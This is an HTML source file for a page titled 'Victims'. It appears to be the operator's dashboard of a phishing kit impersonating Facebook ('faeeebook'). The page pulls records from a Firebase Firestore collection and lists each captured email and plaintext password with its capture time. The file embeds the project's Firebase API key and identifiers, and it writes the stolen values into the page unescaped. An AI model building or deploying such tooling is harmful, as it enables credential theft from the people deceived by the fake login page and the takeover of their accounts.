<!DOCTYPE html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <!-- Bootstrap CSS -->
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3"
      crossorigin="anonymous"
    />

    <title>Victims</title>
  </head>
  <body>
    <div class="container">
      <table class="table">
        <thead class="table-dark">
          <tr>
            <th scope="col">Email</th>
            <th scope="col">Password</th>
            <th scope="col">Captured At</th>
          </tr>
        </thead>
        <tbody id="data"></tbody>
      </table>
    </div>

    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
      crossorigin="anonymous"
    ></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
    <script>
      const firebaseConfig = {
        apiKey: "AIzaSyBDg0JY3jVTbB7Xcj7ZkOuPyRUpUjbx_G8",

        authDomain: "faeeebook.firebaseapp.com",

        projectId: "faeeebook",

        storageBucket: "faeeebook.appspot.com",

        messagingSenderId: "278292202841",

        appId: "1:278292202841:web:47d5b73a5b72e18c52f848",

        measurementId: "G-8LKXTGTR3K",
      };

      // Initialize Firebase
      firebase.initializeApp(firebaseConfig);
      const db = firebase.firestore();
      const dataHolder = document.getElementById("data");
      db.collection("users")
        .get()
        .then((querySnapshot) => {
          querySnapshot.forEach((doc) => {
            const obj = doc.data();
            console.log(obj);
            dataHolder.innerHTML += ` <tr>
            <td>${obj.email}</td>
            <td>${obj.password}</td>
            <td>${new Date(obj.date.seconds * 1000)}</td>
          </tr>`;

            console.log(obj);
          });
        });
    </script>
  </body>
</html>
